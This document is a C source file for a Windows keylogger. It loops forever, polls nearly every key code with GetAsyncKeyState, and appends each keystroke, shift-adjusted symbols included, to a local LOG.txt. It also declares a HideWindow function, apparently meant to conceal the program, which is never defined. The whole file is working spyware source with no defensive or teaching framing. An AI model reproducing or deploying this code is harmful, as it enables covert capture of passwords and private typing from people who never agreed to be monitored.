#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// FUNCTION DECLARATIONS //
void HideWindow();
void KeystrokeHandler(short key, FILE* logfile);

// MAIN FUNCTION //
int main(){
    
    while(1){
        
        // loop thru keyboard characters
        for(short key = 8; key <= 222; key++){
            
            // check for key press
            // where -32767 means key is pressed
            if(GetAsyncKeyState(key) == -32767){
                FILE* logfile;
                logfile = fopen("LOG.txt", "a");
                KeystrokeHandler(key, logfile);
                fclose(logfile);
            }
        }
    }
    return 0;
}

// FUNCTION DEFINITIONS //
void KeystrokeHandler(short key, FILE* logfile){
    if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
        fputc(key, logfile);
    }
    else if(key > 64 && key < 91){
        fputc(key+32, logfile);
    }
    else{
        switch(key){    
            case VK_SPACE: fputs("[SPACE]", logfile); break;
            case VK_TAB: fputs("[TAB]", logfile); break;
            case VK_BACK: fputs("[BACKSPACE]", logfile); break;
            case VK_RETURN: fputs("[ENTER]", logfile); break;
            case VK_SHIFT: fputs("[SHIFT]", logfile); break;
            case VK_CONTROL: fputs("[CTRL]", logfile); break;
            case VK_MENU: fputs("[ALT]", logfile); break;
            case VK_ESCAPE: fputs("[ESC]", logfile); break;
            case VK_CAPITAL: fputs("[CAPS LOCK]", logfile); break;
            case VK_OEM_1: fputs("[;:]", logfile); break;
            case VK_OEM_2: fputs("[/?]", logfile); break;
            case VK_OEM_3: fputs("[`~]", logfile); break;
            case VK_OEM_4: fputs("[ [{ ]", logfile); break;
            case VK_OEM_5: fputs("[\\|]", logfile); break;
            case VK_OEM_6: fputs("[ ]} ]", logfile); break;
            case VK_OEM_7: fputs("['\"]", logfile); break;
            case 187: fputc('+', logfile); break;
            case 188: fputc(',', logfile); break;
            case 189: fputc('-', logfile); break;
            case 190: fputc('.', logfile); break;
            case VK_NUMPAD0: fputc('0', logfile); break;
            case VK_NUMPAD1: fputc('1', logfile); break;
            case VK_NUMPAD2: fputc('2', logfile); break;
            case VK_NUMPAD3: fputc('3', logfile); break;
            case VK_NUMPAD4: fputc('4', logfile); break;
            case VK_NUMPAD5: fputc('5', logfile); break;
            case VK_NUMPAD6: fputc('6', logfile); break;
            case VK_NUMPAD7: fputc('7', logfile); break;
            case VK_NUMPAD8: fputc('8', logfile); break;
            case VK_NUMPAD9: fputc('9', logfile); break;
            case 48:
                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
                else{ fputc('0', logfile); }
                break;
            case 49:
                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
                else{ fputc('1', logfile); }
                break;
            case 50:
                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
                else{ fputc('2', logfile); }
                break;
            case 51:
                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
                else{ fputc('3', logfile); }
                break;
            case 52:
                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
                else{ fputc('4', logfile); }
                break;
            case 53:
                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
                else{ fputc('5', logfile); }
                break;
            case 54:
                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
                else{ fputc('6', logfile); }
                break;
            case 55:
                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
                else{ fputc('7', logfile); }
                break;
            case 56:
                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
                else{ fputc('8', logfile); }
                break;
            case 57:
                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
                else{ fputc('9', logfile); }
                break;
        }
    }
}